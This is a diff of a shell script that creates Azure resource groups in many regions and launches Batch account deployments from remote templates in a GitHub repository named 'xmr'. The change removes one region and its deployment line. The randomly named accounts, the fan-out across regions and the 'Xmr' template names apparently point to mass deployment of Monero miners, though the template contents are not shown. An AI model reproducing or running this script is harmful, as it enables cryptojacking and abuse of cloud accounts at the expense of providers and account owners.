@@ -31,7 +31,6 @@ az group create --name canadaeast --location canadaeast
 az group create --name southindia --location southindia
 az group create --name koreasouth --location koreasouth
 az group create --name australiacentral --location australiacentral
-az group create --name australiacentral2 --location australiacentral2
 az group create --name australiasoutheast --location australiasoutheast
 az deployment group create --parameters batchAccounts_abc0682d9_name='aaa9283'$RANDOM$RANDOM location='switzerlandnorth' --resource-group switzerlandnorth --no-wait --template-uri https://raw.githubusercontent.com/anotheruser1811/xmr/main/XmrTemplate.json
 az deployment group create --parameters batchAccounts_abc0682d9_name='sdngs444'$RANDOM$RANDOM location='southeastasia' --resource-group southeastasia --no-wait --template-uri https://raw.githubusercontent.com/anotheruser1811/xmr/main/XmrTemplate2.json
@@ -66,5 +65,4 @@ az deployment group create --parameters batchAccounts_abc0682d9_name='galuocnhe'
 az deployment group create --parameters batchAccounts_abc0682d9_name='trauden'$RANDOM$RANDOM location='southindia' --resource-group southindia --no-wait --template-uri https://raw.githubusercontent.com/anotheruser1811/xmr/main/XmrTemplate31.json
 az deployment group create --parameters batchAccounts_abc0682d9_name='chaoluon'$RANDOM$RANDOM location='koreasouth' --resource-group koreasouth --no-wait --template-uri https://raw.githubusercontent.com/anotheruser1811/xmr/main/XmrTemplate32.json
 az deployment group create --parameters batchAccounts_abc0682d9_name='caimuxanh'$RANDOM$RANDOM location='australiacentral' --resource-group australiacentral --no-wait --template-uri https://raw.githubusercontent.com/anotheruser1811/xmr/main/XmrTemplate33.json
-az deployment group create --parameters batchAccounts_abc0682d9_name='anhhungrom'$RANDOM$RANDOM location='australiacentral2' --resource-group australiacentral2 --no-wait --template-uri https://raw.githubusercontent.com/anotheruser1811/xmr/main/XmrTemplate34.json
 az deployment group create --parameters batchAccounts_abc0682d9_name='hoailinh'$RANDOM$RANDOM location='australiasoutheast' --resource-group australiasoutheast --no-wait --template-uri https://raw.githubusercontent.com/anotheruser1811/xmr/main/XmrTemplate35.json
